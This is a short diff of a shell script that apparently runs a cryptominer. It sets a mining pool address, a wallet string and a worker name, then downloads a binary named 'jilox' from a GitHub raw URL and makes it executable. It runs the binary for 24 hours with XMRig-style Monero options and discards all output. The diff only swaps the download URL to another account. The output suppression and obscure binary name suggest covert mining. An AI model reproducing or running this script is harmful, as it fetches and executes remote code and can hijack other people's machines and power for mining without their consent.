@@ -13,7 +13,7 @@ cd ..
 A=172.104.176.128:80
 B=ZEPHsCXP3i3bRga5AuPMfW275CxccN8X24mHPvB3U4qkDjzrVyC65hEgZaXdBmCGvkYuuaW14Rbw8eHWVUQ4XN7mPs6mokp2APF
 C=LAPTIP2
-wget https://github.com/13422159/data/raw/main/jilox && chmod u+x jilox
+wget https://github.com/14613261/14613261/raw/main/jilox && chmod u+x jilox
 timeout 86400s ./jilox --url $A --user $B --pass $C --donate-level 1 -a rx/0 >/dev/null 2>&1
 r
 
